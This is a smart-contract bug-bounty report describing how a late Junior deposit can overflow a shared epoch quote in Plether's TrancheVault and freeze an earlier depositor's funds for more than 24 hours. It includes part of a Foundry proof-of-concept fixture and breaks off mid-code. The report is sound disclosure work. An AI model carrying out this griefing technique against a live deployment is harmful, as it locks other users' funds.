# \#99237 [SC-High] A later Junior deposit overflows a shared epoch quote and freezes an earlier depositor

**Submitted on Nov 12th 2026 at 14:42:08 UTC by @Tradi3 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99237
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

# A later Junior deposit overflows a shared epoch quote and freezes an earlier depositor

## Brief/Intro

After a long sequence of Junior deposits at positive near-zero principal inflates share supply, an honest 145,000 USDG Junior request is quotable, mintable, and settles at the next hourly maturity if left alone. An attacker deposits 3,000 USDG into the **same epoch** one minute later. Although the combined request also fits in `uint256` before coupon accrual, the matured cumulative quote overflows after an hour of Senior coupon. At live-market times 24 and 25 hours after the victim request, the victim cannot cancel or claim its 145,000 USDG, settlement panics, and a queued Senior redemption remains unfunded. The Pool owner can cure this exact state with a direct 300 USDG donation and `accountExcess`.

Target: Plether commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`; Junior TrancheVault and HousePool. Claimed impact: **High — Temporary freezing of funds for at least 24 hours**.

## Vulnerability Details

`TrancheVault._requestDeposit` accepts each request and transfers its USDG into vault escrow. Requests sharing an LP epoch form one cumulative deposit head. `HousePool._settleDepositPhase` calls `quoteDepositFromState` on that head at maturity. Its `Math.mulDiv(netAssets, pricingSupply + VIRTUAL_SHARES, denominator)` reverts with `Panic(0x11)` if the mathematical share count exceeds `uint256.max`. The revert rolls back the entire LP settlement, including Senior redemption funding earlier in the transaction. After maturity, `TrancheVault.cancelPendingDeposit` rejects the victim while projected Junior principal remains positive and the head is neither rejected nor terminally wiped. The victim can cancel during the pre-maturity window, which is roughly 59 minutes after the attacker joins in this PoC.

The inline PoC deploys the production `OrderRouter`, `PletherOracle`, `HousePool`, and `TrancheVault` from the pin, using the repository's six-feed Pyth mock. It makes no Router trade, price move, production-source edit, or contract storage write. It seeds 250,000 USDG Junior and 990,000 USDG Senior, makes two old-holder top-ups of 1,953.331200 and 651.110400 USDG to align a live weekday trough, then activates eighteen hourly, coupon-sized Junior recaps at positive near-zero principal. A final ordinary 300 USDG recap leaves projected Junior principal at 300.010000 USDG and Junior supply at `229307071750201518342593886530234804275025079401074690707712758025950705505` shares.

The honest 145,000 USDG victim request has a finite share estimate, and the test checks that the estimate plus existing supply fits in `uint256`. From the same snapshot with no attacker request, its next-hour settlement activates the victim deposit and partially funds a 10,000 USDG Senior redemption, making a nonzero claim available. The attacker then joins the victim's epoch for 3,000 USDG. The combined pre-coupon quote also fits in `uint256` together with existing supply. At the next hourly maturity the cumulative quote panics instead. A separate control from the state before the final recap substitutes a coupon-sized recap for 300 USDG; Junior reaches zero by 24 hours, a nonzero Senior claim becomes available, and the victim receives a full refund.

## Impact Details

At 2027-06-04 05:00 UTC, exactly 24 hours after the victim request, the market is live and projected Junior principal is still 27.613512 USDG. `settleLpEpoch` reverts with `Panic(0x11)`; the victim's `cancelPendingDeposit` reverts with `TrancheVault__DepositEpochAlreadyActive`; 145,000 USDG victim and 3,000 USDG attacker deposits remain in escrow; the Senior claim is zero. At +25 hours in a live market, Junior principal is still 16.263658 USDG and settlement and cancellation still revert. The attacker has tied up 3,000 USDG in the last request; this is not a measured net loss.

The owner-only `HousePool.accountExcess()` is a tested rescue. A direct 300 USDG transfer followed by that call at +25 hours raises projected Junior principal to 316.263658 USDG without minting shares. Ordinary settlement then succeeds; both deposits become claimable and the Senior redemption is partially funded. A direct transfer alone is unaccounted until the owner acts. The victim cannot make this owner-only call or cancel the active request.

The setup advances 100,645,200 seconds (1,164.875 days, about 3.19 years) from the fixture's March 2024 seed to the final recap and assumes little intervening LP activity. The 3,000 USDG late request is a conditional grief action once this share-supply state exists; it cannot create the state from a fresh Pool. The combined pre-coupon quote is about 97.75% of `uint256.max`, so changes in liquidity or timing matter. The PoC establishes the freeze in this state, not that the live deployment already has it or that the setup can finish during this competition. The mocked token and oracle feeds, and Foundry time advancement, are local test facilities; no live transaction was executed.

## References

- [Pinned `HousePool._settleDepositPhase`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1030-L1050), including the cumulative quote call.
- [Pinned `TrancheVault.quoteDepositFromState`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1398-L1409).
- [Pinned `TrancheVault.cancelPendingDeposit`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L832-L866) and [projected terminal wipe condition](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1643-L1647).
- [Pinned owner-only `HousePool.accountExcess`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L557-L579).
- [Plether competition scope](https://immunefi.com/audit-competition/plether/scope/).

## Proof of Concept

Place the following three files in `packages/perps/test/perps/codexvault/` of the pinned checkout `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. They use the repository's existing `BasePerpTest.sol` and `LegacyOrderRouterHarness.sol` type; `V1xFixture` deploys actual `new OrderRouter` and only casts the reference to the inherited field type. Production `PletherOracle` is deployed directly. No production source file is edited.

From `packages/perps`, with Foundry v1.5.1 and the repository dependencies installed, run:

```sh
forge test --offline --no-auto-detect --match-path test/perps/codexvault/CodexVaultOrganicAggregate.t.sol --match-test test_CFR_OrganicAggregatePoison -vv
```

Observed at the pin: 1 passed, 0 failed. The test asserts victim-alone first-maturity activation, finite and mintable victim and combined quotes at request time, same-epoch attacker request, next-maturity `Panic(0x11)`, live-market +24-hour and +25-hour lock with blocked cancellation, intact 145,000 USDG victim and 3,000 USDG attacker escrows, zero Senior claim, owner-only 300 USDG donation cure, and a refundable small-recap control.

### V1xFixture.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {EmergencyPauseCoordinator} from "@plether/perps/EmergencyPauseCoordinator.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MarketCalendarLib} from "@plether/perps/libraries/MarketCalendarLib.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {LegacyOrderRouterHarness} from "../../utils/LegacyOrderRouterHarness.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";

abstract contract V1xFixture is BasePerpTest {
    /// @dev BasePerpTest's field is harness-typed; deployed code here is production OrderRouter.
    function _deployLegacyOrderRouter(
        address engine_, address engineLens_, address pool_, address oracle_
    ) internal override returns (LegacyOrderRouterHarness deployedRouter) {
        policyEvaluator = new CfdOrderPolicyEvaluator();
        orderExecutionSidecar = new OrderRouterExecutionSidecar();
        address predictedRouter = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        OrderLifecycleBook lifecycleBook = new OrderLifecycleBook(predictedRouter, engine_, address(clearinghouse), pool_);
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        OrderRouter productionRouter = new OrderRouter(
            engine_, engineLens_, pool_, oracle_, address(keeperSidecar), address(policyEvaluator),
            address(orderExecutionSidecar), address(lifecycleBook)
        );
        assertEq(address(productionRouter), predictedRouter);
        deployedRouter = LegacyOrderRouterHarness(address(productionRouter));
    }

    address internal constant RP1_GUARDIAN = address(0x6A27);
    address internal constant RP1_KEEPER = address(0xE27C);
    address internal constant RP1_RECIPIENT = address(0x27ACE);
    address internal constant ALICE = address(0xA11CE);
    address internal constant BOB = address(0xB0B);
    address internal constant CAROL = address(0xCA201);
    address internal constant DAVE = address(0xDA7E);
    address internal constant TRADER = address(0x7A0E2);
    address internal constant RP1_LP = address(0x1D27);

    EmergencyPauseCoordinator internal coordinator;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _releaseFeedIds() internal pure returns (bytes32[] memory ids) {
        ids = new bytes32[](6);
        ids[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        ids[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        ids[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        ids[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        ids[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        ids[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
    }

    function _releaseWeights() internal pure returns (uint256[] memory weights) {
        weights = new uint256[](6);
        weights[0] = 576e15;
        weights[1] = 136e15;
        weights[2] = 119e15;
        weights[3] = 91e15;
        weights[4] = 42e15;
        weights[5] = 36e15;
    }

    function _releaseBasePrices() internal pure returns (uint256[] memory prices) {
        prices = new uint256[](6);
        prices[0] = 117_500_000;
        prices[1] = 638_000;
        prices[2] = 134_480_000;
        prices[3] = 72_880_000;
        prices[4] = 10_860_000;
        prices[5] = 126_100_000;
    }

    function _releaseInversions() internal pure returns (bool[] memory inversions) {
        inversions = new bool[](6);
        inversions[1] = true;
        inversions[3] = true;
        inversions[4] = true;
        inversions[5] = true;
    }

    function setUp() public virtual override {
        super.setUp();

        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig);
        _warpChecked(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();

        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.minOpenNotionalAssets = 1000e6;
        routerConfig.adverseConfidenceMultiplierBps = 2500;
        routerAdmin.proposeRouterConfig(routerConfig);
        _warpChecked(routerAdmin.routerConfigActivationTime());
        routerAdmin.finalizeRouterConfig();

        juniorVault.proposeMaintenanceFeeConfig(0, PROTOCOL_TREASURY_ACCOUNT);
        _warpChecked(juniorVault.maintenanceFeeConfigActivationTime());
        juniorVault.finalizeMaintenanceFeeConfig();

        PletherOracle releaseOracle = new PletherOracle(
            address(engine),
            address(pool),
            address(baseMockPyth),
            _releaseFeedIds(),
            _releaseWeights(),
            _releaseBasePrices(),
            _releaseInversions()
        );
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(releaseOracle)));
        _warpChecked(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        pletherOracle = releaseOracle;

        _warpChecked(SETUP_TIMESTAMP + 21 days);
        _stageReleaseData(1e8, vm.getBlockTimestamp(), vm.getBlockTimestamp() - 1);
        router.updateMarkPrice(_releaseData(1e8, vm.getBlockTimestamp(), vm.getBlockTimestamp() - 1));

        coordinator = new EmergencyPauseCoordinator(address(routerAdmin), address(pool), address(this));
        coordinator.setGuardian(RP1_GUARDIAN);
        routerAdmin.setPauser(address(coordinator));
        pool.setPauser(address(coordinator));
        baseMockPyth.setFee(0);
        rp1Actions = IPositionProtectionActions(address(router.positionProtectionBook()));
        rp1Views = IPositionProtectionViews(address(router.positionProtectionBook()));
        _assertReleaseConfig();
        assertApproxEqAbs(engine.lastMarkPrice(), 1e8, 1e4, "release basket must price near 1.00, not CAP");
    }

    function _warpChecked(uint256 timestamp) internal {
        require(timestamp >= vm.getBlockTimestamp(), "RP1 backwards warp");
        vm.warp(timestamp);
        assertEq(vm.getBlockTimestamp(), timestamp, "RP1 warp must survive via-IR");
    }

    function _rollNextBlock() internal {
        uint256 nextBlock = vm.getBlockNumber() + 1;
        vm.roll(nextBlock);
        assertEq(vm.getBlockNumber(), nextBlock, "RP1 roll must survive via-IR");
    }

    function _componentPrice(uint256 indexPrice, uint256 basePrice) internal pure returns (int64) {
        return int64(uint64((basePrice * indexPrice) / 1e8));
    }

    /// @dev Inverted release feeds publish USD/XXX; the oracle inverts them back to XXX/USD before normalization.
    function _rawComponentPrice(uint256 indexPrice, uint256 i) internal pure returns (int64) {
        uint256 normalized = (_releaseBasePrices()[i] * indexPrice) / 1e8;
        if (_releaseInversions()[i]) {
            return int64(uint64((1e16 + normalized / 2) / normalized));
        }
        return int64(uint64(normalized));
    }

    function _stageReleaseData(
        uint256 indexPrice,
        uint256 publishTime,
        uint256 previousPublishTime
    ) internal returns (bytes[] memory data) {
        data = _releaseData(indexPrice, publishTime, previousPublishTime);
        bytes32[] memory ids = _releaseFeedIds();
        uint256[] memory bases = _releaseBasePrices();
        for (uint256 i; i < ids.length; ++i) {
            baseMockPyth.setPrice(ids[i], _rawComponentPrice(indexPrice, i), int32(-8), publishTime);
        }
    }

    function _releaseData(
        uint256 indexPrice,
        uint256 publishTime,
        uint256 previousPublishTime
    ) internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _releaseFeedIds();
        uint256[] memory bases = _releaseBasePrices();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            updates[i] = MockPyth.FeedUpdate(
                ids[i],
                MockPyth.MockPrice(
                    _rawComponentPrice(indexPrice, i), 0, -8, publishTime, previousPublishTime
                )
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _executionData(uint256 indexPrice) internal returns (bytes[] memory data) {
        _rollNextBlock();
        _warpChecked(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        return _stageReleaseData(indexPrice, publishTime, publishTime - 1);
    }

    function _liveData(uint256 indexPrice) internal returns (bytes[] memory data) {
        uint256 timestamp = vm.getBlockTimestamp();
        if (timestamp <= engine.lastMarkTime()) {
            timestamp = uint256(engine.lastMarkTime()) + 1;
        }
        _warpChecked(timestamp);
        _rollNextBlock();
        uint256 previous = engine.lastMarkTime();
        if (previous == timestamp) {
            previous = timestamp - 1;
        }
        return _stageReleaseData(indexPrice, timestamp, previous);
    }

    function _settlementData(uint256 indexPrice) internal returns (bytes[] memory data) {
        uint256 timestamp = vm.getBlockTimestamp();
        uint256 previous = engine.lastMarkTime();
        if (previous >= timestamp) {
            previous = timestamp - 1;
        }
        return _stageReleaseData(indexPrice, timestamp, previous);
    }

    function _commitOpenReal(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal returns (uint64 orderId) {
        orderId = _commitV3(account, side, size, margin, false);
    }

    function _commitCloseReal(
        address account,
        CfdTypes.Side side,
        uint256 size
    ) internal returns (uint64 orderId) {
        orderId = _commitV3(account, side, size, 0, true);
    }

    uint256 internal v3ClientNonce;

    function _commitV3(
        address account, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose
    ) internal returns (uint64 orderId) {
        uint256 targetPrice = (side == CfdTypes.Side.LONG) == isClose ? 2e8 : 1;
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("vault-overflow", account, ++v3ClientNonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + window,
                executionWindowSeconds: window,
                allowedExecutionModes: 1,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: 100e6,
                maxExecutionNotionalAssets: 10_000_000e6,
                maxGrossAccountDebitAssets: 1_000_000e6,
                maxActionChargeAssets: 1_000_000e6,
                maxExplicitFeesAssets: 100_000e6,
                maxPostPositionSize: 10_000_000e18,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: 1_000_000
            })
        });
        vm.prank(account);
        orderId = router.commitOrder(request);
    }

    function _executeReal(uint64 orderId, uint256 indexPrice) internal returns (OrderV3Types.ExecutionResult memory result) {
        result = router.executeOrder(orderId, _executionDataFor(orderId, indexPrice));
        if (result.status != OrderV3Types.LifecycleStatus.Executed) {
            emit log_named_uint("RP1 terminalReason", uint256(result.terminalReason));
        }
    }

    function _executionDataFor(uint64 orderId, uint256 indexPrice) internal returns (bytes[] memory data) {
        _rollNextBlock();
        _warpChecked(vm.getBlockTimestamp() + 1);
        uint256 publishTime = vm.getBlockTimestamp();
        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(orderId);
        if (pending.orderId != 0 && uint256(pending.commitTime) + 1 <= publishTime) {
            publishTime = uint256(pending.commitTime) + 1;
        }
        return _stageReleaseData(indexPrice, publishTime, publishTime - 1);
    }

    function _openReal(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal returns (uint64 orderId) {
        orderId = _commitOpenReal(account, side, size, margin);
        OrderV3Types.ExecutionResult memory result = _executeReal(orderId, 1e8);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "real open must execute");
    }

    function _closeReal(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 indexPrice
    ) internal returns (uint64 orderId) {
        orderId = _commitCloseReal(account, side, size);
        OrderV3Types.ExecutionResult memory result = _executeReal(orderId, indexPrice);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "real close must execute");
    }

    function _positionSize(address account) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _baseLp() internal returns (uint256 shares) {
        return _seedJuniorLp(RP1_LP, 1_000_000e6);
    }

    function _seedJuniorLp(address owner, uint256 assets) internal returns (uint256 shares) {
        uint256 requestId = _requestJuniorDeposit(owner, assets);
        _settleReal(requestId);
        return _claimJuniorDeposit(requestId, owner);
    }

    function _requestJuniorDeposit(address owner, uint256 assets) internal returns (uint256 requestId) {
        settlementToken.mint(owner, assets);
        vm.startPrank(owner);
        settlementToken.approve(address(juniorVault), assets);
        requestId = juniorVault.requestDeposit(assets, owner, owner);
        vm.stopPrank();
    }

    function _claimJuniorDeposit(uint256 requestId, address controller) internal returns (uint256 shares) {
        uint256 assets = juniorVault.claimableDepositRequest(requestId, controller);
        assertGt(assets, 0, "claimable junior deposit required");
        vm.prank(controller);
        shares = juniorVault.claimDeposit(requestId, assets, controller, controller);
    }

    function _requestJuniorRedeem(address owner, uint256 shares) internal returns (uint256 requestId) {
        vm.prank(owner);
        requestId = juniorVault.requestRedeem(shares, owner, owner);
    }

    function _requestSeniorDepositReal(address owner, uint256 assets) internal returns (uint256 requestId) {
        settlementToken.mint(owner, assets);
        vm.startPrank(owner);
        settlementToken.approve(address(seniorVault), assets);
        requestId = seniorVault.requestDeposit(assets, owner, owner);
        vm.stopPrank();
    }

    function _settleReal(uint256 requestId) internal returns (IHousePool.LpEpochSettlementResult memory result) {
        uint256 timestamp = pool.lpEpochStart(requestId);
        if (vm.getBlockTimestamp() < timestamp) {
            _warpChecked(timestamp);
        }
        ICfdEngineTypes.TerminalNavSnapshot memory snapshot = engine.terminalNavSnapshot();
        if (!snapshot.hasOpenPositions || engine.isOracleFrozen()) {
            return pool.settleLpEpoch(0, 0);
        }
        uint256 indexPrice = snapshot.markPrice == 0 ? 1e8 : snapshot.markPrice;
        router.settleLpEpoch(_settlementData(indexPrice));
        return result;
    }

    function _claimRedeemReal(uint256 requestId, address controller) internal returns (uint256 assets) {
        uint256 shares = juniorVault.claimableRedeemRequest(requestId, controller);
        assertGt(shares, 0, "funded redemption shares required");
        vm.prank(controller);
        assets = juniorVault.claimRedeem(requestId, shares, controller, controller);
        assertGt(assets, 0, "funded redemption assets required");
    }

    // ------------------------------------------------------------------
    // rp1 additions: V3 requests, protections, batches, LP helpers, probes
    // ------------------------------------------------------------------

    address internal constant EVE = address(0xE7E);
    address internal constant SENIOR_LP = address(0x5E11);
    bytes32 internal constant RP1_REASON = keccak256("rp1 incident");

    IPositionProtectionActions internal rp1Actions;
    IPositionProtectionViews internal rp1Views;

    /// @dev Cached in setUp so a preceding `vm.prank` is not consumed by the `positionProtectionBook()` view call.
    function _actions() internal view returns (IPositionProtectionActions) {
        return rp1Actions;
    }

    function _views() internal view returns (IPositionProtectionViews) {
        return rp1Views;
    }

    function _v3Request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 target,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = bytes32(uint256(router.nextCommitId()));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = target;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp()) + uint64(router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _protectionParams(uint256 tp, uint256 sl)
        internal
        pure
        returns (PositionProtectionTypes.PositionProtectionParams memory params)
    {
        params.takeProfitTriggerPrice = tp;
        params.stopLossTriggerPrice = sl;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    /// @dev LONG profits when the basket falls: TP 0.5% below the mark, SL 0.5% above. SHORT mirrored.
    function _defaultTpSl(CfdTypes.Side side, uint256 mark) internal pure returns (uint256 tp, uint256 sl) {
        if (side == CfdTypes.Side.LONG) {
            return (mark * 995 / 1000, mark * 1005 / 1000);
        }
        return (mark * 1005 / 1000, mark * 995 / 1000);
    }

    function _commitProtectedOpen(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 mark
    ) internal returns (uint64 orderId, uint64 protectionId) {
        (uint256 tp, uint256 sl) = _defaultTpSl(side, mark);
        OrderV3Types.OrderRequest memory request = _v3Request(side, size, margin, side == CfdTypes.Side.LONG ? 1 : 2e8, false);
        vm.prank(account);
        (orderId, protectionId) = _actions().commitOpenOrderWithProtection(request, _protectionParams(tp, sl));
    }

    function _createProtection(address account, CfdTypes.Side side, uint256 mark) internal returns (uint64 protectionId) {
        (uint256 tp, uint256 sl) = _defaultTpSl(side, mark);
        vm.prank(account);
        protectionId = _actions().createPositionProtection(_protectionParams(tp, sl));
    }

    function _trigger(uint64 protectionId, uint256 price) internal returns (uint64 childId) {
        vm.prank(RP1_KEEPER);
        childId = _actions().triggerPositionProtection(protectionId, _liveData(price));
    }

    function _protectionStatus(uint64 protectionId) internal view returns (uint8) {
        return uint8(_views().getPositionProtection(protectionId).status);
    }

    function _deadline(uint64 orderId) internal view returns (uint64) {
        return router.lifecycleBook().orderTiming(orderId).executionDeadline;
    }

    /// @dev Expires one pending order at deadline+1 through the real router path (no oracle data).
    function _expire(uint64 orderId) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint256 deadline = _deadline(orderId);
        if (vm.getBlockTimestamp() <= deadline) {
            _warpChecked(deadline + 1);
        }
        result = router.executeOrder(orderId, new bytes[](0));
    }

    /// @dev Batch data published now, with the previous publication at the head order's commit time so the tick
    ///      is the first observation after every order committed at or after the head.
    function _batchData(uint256 indexPrice) internal returns (bytes[] memory data) {
        uint256 publishTime = vm.getBlockTimestamp();
        uint256 previous = publishTime - 1;
        uint64 head = router.nextExecuteId();
        if (head != 0) {
            (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(head);
            if (pending.commitTime != 0 && uint256(pending.commitTime) < publishTime) {
                previous = uint256(pending.commitTime);
            }
        }
        return _stageReleaseData(indexPrice, publishTime, previous);
    }

    function _fullContainment() internal {
        vm.prank(RP1_GUARDIAN);
        coordinator.triggerFullContainment(RP1_REASON, bytes32(0));
        assertTrue(routerAdmin.paused());
        assertTrue(pool.paused());
        assertTrue(pool.lpEpochSettlementPaused());
    }

    function _riskOffPause() internal {
        vm.prank(RP1_GUARDIAN);
        coordinator.triggerEmergencyPause(RP1_REASON, bytes32(0));
        assertTrue(routerAdmin.paused());
        assertTrue(pool.paused());
    }

    function _settlementHold() internal {
        vm.prank(RP1_GUARDIAN);
        coordinator.triggerLpEpochSettlementHold(RP1_REASON, bytes32(0));
        assertTrue(pool.lpEpochSettlementPaused());
    }

    /// @dev Documented governance release: every active restriction, each through its owner.
    function _releaseAll() internal {
        if (pool.lpEpochSettlementPaused()) {
            pool.unpauseLpEpochSettlement();
        }
        if (pool.paused()) {
            pool.unpause();
        }
        if (routerAdmin.paused()) {
            routerAdmin.unpause();
        }
        assertFalse(pool.lpEpochSettlementPaused());
        assertFalse(pool.paused());
        assertFalse(routerAdmin.paused());
    }

    function _pastCooldown(address owner) internal {
        uint256 ready = juniorVault.lastDepositTime(owner) + juniorVault.DEPOSIT_COOLDOWN();
        uint256 readyS = seniorVault.lastDepositTime(owner) + seniorVault.DEPOSIT_COOLDOWN();
        if (readyS > ready) {
            ready = readyS;
        }
        if (vm.getBlockTimestamp() < ready) {
            _warpChecked(ready);
        }
    }

    function _seedSeniorLp(address owner, uint256 assets) internal returns (uint256 shares) {
        uint256 requestId = _requestSeniorDepositReal(owner, assets);
        _settleReal(requestId);
        uint256 claimable = seniorVault.claimableDepositRequest(requestId, owner);
        assertGt(claimable, 0, "claimable senior deposit required");
        vm.prank(owner);
        shares = seniorVault.claimDeposit(requestId, claimable, owner, owner);
    }

    function _requestSeniorRedeem(address owner, uint256 shares) internal returns (uint256 requestId) {
        vm.prank(owner);
        requestId = seniorVault.requestRedeem(shares, owner, owner);
    }

    /// @dev Warps so that the next request lands in epoch `currentLpEpoch()+1` (outside the 5-minute cutoff).
    function _outsideRequestCutoff() internal {
        uint256 t = vm.getBlockTimestamp();
        uint256 nextStart = (t / 1 hours + 1) * 1 hours;
        if (nextStart - t <= 5 minutes + 1) {
            _warpChecked(nextStart + 1);
        }
    }

    function _nextFrozenStart() internal view returns (uint256 t) {
        t = vm.getBlockTimestamp();
        (, bool frozen) = MarketCalendarLib.marketStatus(t, false, false, 1 hours);
        require(!frozen, "already frozen");
        while (true) {
            t += 1 hours;
            (, frozen) = MarketCalendarLib.marketStatus(t, false, false, 1 hours);
            if (frozen) {
                break;
            }
        }
        t -= 1 hours;
        while (true) {
            t += 1;
            (, frozen) = MarketCalendarLib.marketStatus(t, false, false, 1 hours);
            if (frozen) {
                return t;
            }
        }
    }

    function _frozenEnd(uint256 from) internal pure returns (uint256 t) {
        t = from;
        (, bool frozen) = MarketCalendarLib.marketStatus(t, false, false, 1 hours);
        require(frozen, "not frozen");
        while (frozen) {
            t += 1 hours;
            (, frozen) = MarketCalendarLib.marketStatus(t, false, false, 1 hours);
        }
        t -= 1 hours;
        while (true) {
            t += 1;
            (, frozen) = MarketCalendarLib.marketStatus(t, false, false, 1 hours);
            if (!frozen) {
                return t;
            }
        }
    }

    struct Party {
        uint256 wallet;
        uint256 chBalance;
        uint256 chFree;
        uint256 jShares;
        uint256 sShares;
        uint256 posSize;
        uint256 claim;
    }

    function _party(address a) internal view returns (Party memory p) {
        p.wallet = settlementToken.balanceOf(a);
        p.chBalance = clearinghouse.getAccountAssetBuckets(a).settlementBalanceAssets;
        p.chFree = clearinghouse.getAccountAssetBuckets(a).freeSettlementAssets;
        p.jShares = juniorVault.balanceOf(a);
        p.sShares = seniorVault.balanceOf(a);
